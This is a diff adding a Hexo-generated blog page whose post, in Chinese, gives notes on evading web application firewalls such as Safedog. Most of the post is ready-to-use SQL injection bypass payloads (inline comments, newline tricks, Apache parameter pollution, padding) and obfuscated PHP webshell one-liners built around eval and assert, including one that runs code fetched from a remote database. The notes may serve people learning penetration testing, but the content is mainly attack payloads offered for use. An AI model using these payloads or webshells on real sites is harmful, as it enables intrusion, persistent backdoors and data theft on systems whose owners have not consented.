@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/favicon.ico >
+    <title>
+        Hexo
+    </title>
+    <meta name="description" content=  >
+    <meta name="keywords" content= Blog,Hexo,Theme,刘训灼,LiuXunzhuo >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <p>bypass-WAF1<br>1、什么是bypass<br>bypass =&gt;绕过的意思</p>
+<p>WAF全名叫做web应用防护系统<br>常见的软WAF：安全狗、云锁、悬镜、护卫神、云盾</p>
+<p>WAF的核心：通过正则匹配，如果符合规则就拦截比如 and 1=1 </p>
+<p>绕过方式：<br>大小写绕过：And 1=1  编码绕过<br>and 1=1 连接在一起拦截 and 不拦截 1=1 不拦截<br>尝试替换<br>and   =&gt;   &amp; 1=1                          他是连接传参的&amp;id=1 需要编码才能用 &amp;他是连接符所以要编码<br>1=1   =&gt; -1=-1  -1=-2</p>
+<p>检测sql注入<br>12进制 0X32<br>+-*/</p>
+<p>union select 被拦截<br>内联注释 /<em>!…</em>/  是为了MYsQL为了保持与其他数据库兼容将mysql中持有的语句放在/<em>!</em>/中<br>union /<em>!1044select</em>/ 1,2,3</p>
+<p>%0a换行<br>– qwe/<em>%0afrom admin%23</em>/<br>通过内联注释 和%0a 换行可以绕过<br>– qwe/<em>%0afrom admin%23</em>/ 在安全狗认为这是安全的<br>– qwe/* 是注释这个<br>剩下%0afrom admin%23*/  %0a换行 剩下 from admin%23*/ </p>
+<p>##########################演示 %23 是编码#<br>union /<em>!1044select</em>/ 1,2,3 – qwe/<em>%0afrom admin%23</em>/<br>//注释掉 – qwe /*<br> union /<em>!1044select</em>/ 1,2,3 %0afrom admin%23*/<br> %0a换行 剩下 可以执行语句 直接绕过<br> union /<em>!1044select</em>/ 1,2,3 from admin%23*/</p>
+<p>换行+注释方法绕过<br>union #/<em>%0a select 1,2,3 from admin#</em>/</p>
+<p>函数加反引号，可以执行<br><code>sleep</code>(5)<br>updatexml</p>
+<p>容器的特性方法<br>iis 传参里面 s%e%l%e%c%t 他会认为你输入的是 =&gt; select<br>Apache hpp<br>a<br>id=1/<em>&amp;id=2%23</em>/  安全狗只会检测前面的id=1 因为后面的他会把/*当作是注释 就放过去了 实际上数据库执行的是后面的id=2</p>
+<p>id=1/<em>&amp;id=2 union select 1,2,3 from admin limit0,1%23</em>/  这是Apache特有的</p>
+<p>白名单管理员权限或者是127.0.0.1本地访问不拦截</p>
+<p>缓存区 （数据太多了，超出了WAF的检测范围 于是乎他不在对你拦截）<br>需要改POST传参<br>python脚本写的 直接堆上去 4500个 union selec 1，2，3 from admin 万能方法</p>
+<p>webshell绕过<br>当安全狗检测一句话木马是 可以用 end来替换[]  连接传参 ?a=phpinfo(); 没有密码随便传参<br><?php eval(end($_REQUEST));?>    </p>
+<p>定义一个常量define 传参为a的东西会放入常量，eval执行a里面的东西<br><?php define("a","$_REQUEST[a]");eval(a);?></p>
+<p>通过字符串拼接+双美元符号</p>
+<?php
+$a='ass';   //变量一个a=ass 
+$b='ert';   //变量一个b=ert   
+$funcName=$a.$b;  //结合在一起 等于 assert
+$x='funcName';  
+$$x($_REQUEST[a]);  //最终输出 assert($_REQUEST[a])
+?>
+
+<p>通过函数定义强行分割<br>&lt;?php<br>funcName a($a){<br>return $a;}<br>eval(a($_REQUEST)[‘a’]);  </p>
+<p>通过定义类，然后传参强行分割,类似于反序列化<br>&lt;?php</p>
+<p>class User<br>{<br>public $name= ‘’;<br>function __destruct(){<br>eval(“$this-&gt;name”);<br>    }<br>}<br>$user =new User;<br>$user-&gt;name= ‘’.$_REQUEST[8];<br>?&gt;</p>
+<p>cookie传参  需要 加个assert cookie<br><?php
+$COOKIE = $_COOKIE;
+foreach($COOKIE as $key => $value){
+if($key=='assert'){
+$key($_REQUEST['a']);
+}
+}?><br>/////<br><?php 
+$a=get_defined_functions();
+$a[internal][847]($_REQUEST[8]);  ///847是assert
+?></p>
+<p>藏webshell妙招<br><?php include('/123.txt')?> + echo “<?php eval($_REQUEST[8])?>“ &gt;&gt;/:123.txt</p>
+<p>终极手法、绕过市面上所有的WAF</p>
+<?php
+eval(mysql_fetch_assoc(mysqli_query(mysqli_connect('192.Xxx','root','root','maoshe'),'select * from info'))['info'])
+?>
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>Copyright © 2020 | Author: 小九 | Theme By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="NOsswOncKgc8HOxqo9oxIWlX-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="z1FihjWEbS8uIfUQdmCtK7zz">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
